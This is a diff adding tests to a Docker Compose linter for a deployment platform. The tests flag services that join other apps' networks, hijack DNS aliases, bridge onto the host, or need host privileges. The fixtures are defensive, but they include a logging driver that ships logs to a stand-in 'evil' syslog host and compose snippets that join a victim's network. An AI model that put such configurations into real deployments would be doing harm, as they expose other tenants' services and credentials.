@@ -3,6 +3,7 @@ import assert from "node:assert/strict";
 
 import {
   composeBuildReachesHost,
+  composeJoinsForeignNetwork,
   composeClaimsReservedName,
   composeHasHostBindMount,
   composeMountsForeignStorage,
@@ -449,6 +450,82 @@ test("composeBuildReachesHost: absolute/ssh/privileged build reaches the host; a
  * past every check. A same-file `extends: {service}` is fine — that service IS
  * linted.
  */
+/**
+ * The network twin of the foreign-STORAGE gate. Joining a network this app does
+ * not own reaches another stack's unpublished services at L3 AND registers this
+ * service's name as a DNS alias there — so calling a service `postgres` collects
+ * the victim's own internal lookups, password and all. The shared-network
+ * protections (alias drop, reserved names) only cover the `deplo` network.
+ */
+test("composeJoinsForeignNetwork: an external/pinned/host-bridged network join needs the grant", () => {
+  const joins = (nets: string) =>
+    composeJoinsForeignNetwork(`services:\n  a:\n    image: x\n    networks: [v]\n${nets}`);
+  assert.equal(joins(`networks:\n  v:\n    external: true\n    name: deplo-victim_default`), true);
+  assert.equal(joins(`networks:\n  v:\n    name: deplo-victim_default`), true);
+  assert.equal(joins(`networks:\n  v:\n    external: true`), true);
+  assert.equal(joins(`networks:\n  v:\n    external:\n      name: deplo-victim_default`), true);
+  // A driver that bridges onto the host's own segment reaches past the app too.
+  assert.equal(joins(`networks:\n  v:\n    driver: macvlan\n    driver_opts:\n      parent: eth0`), true);
+  // Map form of the service join is read the same way.
+  assert.equal(
+    composeJoinsForeignNetwork(
+      `services:\n  a:\n    image: x\n    networks:\n      v: null\nnetworks:\n  v:\n    external: true\n    name: deplo-victim_default`,
+    ),
+    true,
+  );
+});
+
+test("composeJoinsForeignNetwork: an app's own network, and the shared one, stay free", () => {
+  // The everyday case: a private per-app network.
+  assert.equal(
+    composeJoinsForeignNetwork(
+      `services:\n  a:\n    image: x\n    networks: [internal]\nnetworks:\n  internal: {}`,
+    ),
+    false,
+  );
+  // The shared `deplo` network is governed by its own choke point — by key AND
+  // under an alias that points at it by name.
+  assert.equal(
+    composeJoinsForeignNetwork(
+      `services:\n  a:\n    image: x\n    networks: [deplo]\nnetworks:\n  deplo:\n    external: true`,
+    ),
+    false,
+  );
+  assert.equal(
+    composeJoinsForeignNetwork(
+      `services:\n  a:\n    image: x\n    networks: [sneaky]\nnetworks:\n  sneaky:\n    external: true\n    name: deplo`,
+    ),
+    false,
+  );
+  // Declared but never attached deploys nothing.
+  assert.equal(
+    composeJoinsForeignNetwork(
+      `services:\n  a:\n    image: x\nnetworks:\n  v:\n    external: true\n    name: deplo-victim_default`,
+    ),
+    false,
+  );
+  assert.equal(composeJoinsForeignNetwork(`services:\n  a:\n    image: nginx`), false);
+});
+
+test("oom_score_adj is a privilege only when NEGATIVE; group_add and a foreign logging driver always are", () => {
+  const svc = (line: string) =>
+    composeNeedsHostPrivileges(`services:\n  a:\n    image: x\n${line}`);
+  // Negative = "kill my neighbours first", the oom_kill_disable effect by degrees.
+  assert.equal(svc("    oom_score_adj: -1000"), true);
+  // Positive only volunteers this container — free.
+  assert.equal(svc("    oom_score_adj: 500"), false);
+  assert.equal(svc(`    group_add: ["docker"]`), true);
+  assert.equal(
+    svc(`    logging:\n      driver: syslog\n      options:\n        syslog-address: "tcp://evil:514"`),
+    true,
+  );
+  // json-file's own size knobs are what deplo's logs read from — free.
+  assert.equal(
+    svc(`    logging:\n      driver: json-file\n      options:\n        max-size: 10m`),
+    false,
+  );
+});
+
 test("composeUsesExternalMerge: extends-file, include, label_file are refused; same-file extends is not", () => {
   assert.equal(
     composeUsesExternalMerge(
